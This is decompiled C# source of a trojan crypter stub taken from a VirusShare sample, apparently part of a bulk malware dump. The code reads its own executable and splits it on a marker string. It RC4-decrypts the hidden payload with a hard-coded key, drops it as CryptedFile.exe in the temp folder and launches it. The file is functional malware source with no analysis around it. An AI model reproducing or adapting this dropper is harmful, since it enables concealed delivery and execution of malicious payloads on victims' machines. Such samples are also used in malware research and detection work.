// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SoraAdd, Version=3.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 433510B1-46B2-4050-A4F1-F428588C527D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Crypt.btlb-6da145ad243e668e8980779ac0edaac4955308854ffb9202c1af219628a01167.exe

using \u0004;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0004
{
  [DesignerGenerated]
  internal sealed class \u0003 : Form
  {
    private IContainer \u0001;
    private const string \u0002 = "YesNewBeg";

    [DebuggerNonUserCode]
    public \u0003()
    {
      \u0003 obj = this;
      // ISSUE: virtual method pointer
      this.Load += new EventHandler((object) obj, __vmethodptr(obj, \u0003));
      this.\u0003();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0003()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 55);
      this.Name = "Form1";
      this.Text = "Form1";
      this.ResumeLayout(false);
    }

    private void \u0003(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = -2;
label_1:
        int num3 = 2;
        string tempPath = Path.GetTempPath();
label_2:
        num3 = 3;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_3:
        num3 = 4;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_4:
        num3 = 5;
        FileSystem.FileGet(1, ref Expression);
label_5:
        num3 = 6;
        FileSystem.FileClose(1);
label_6:
        num3 = 7;
        string[] strArray = Strings.Split(Expression, "YesNewBeg");
label_7:
        num3 = 8;
        string str = \u0003.\u0003(strArray[1], "AlrightThisWillDeverseTheEffects");
label_8:
        num3 = 9;
        FileSystem.FileOpen(5, tempPath + "\\CryptedFile.exe", OpenMode.Binary, OpenAccess.ReadWrite);
label_9:
        num3 = 10;
        FileSystem.FilePut(5, str, -1L, false);
label_10:
        num3 = 11;
        FileSystem.FileClose(5);
label_11:
        num3 = 12;
        Process.Start(tempPath + "\\CryptedFile.exe");
label_12:
        num3 = 13;
        this.Close();
        ProjectData.EndApp();
        goto label_19;
label_14:
        num1 = num3;
        switch (num2 > -2 ? num2 : 1)
        {
          case 1:
            int num4 = num1 + 1;
            num1 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_19;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_14;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_19:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static string \u0003(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }
  }
}
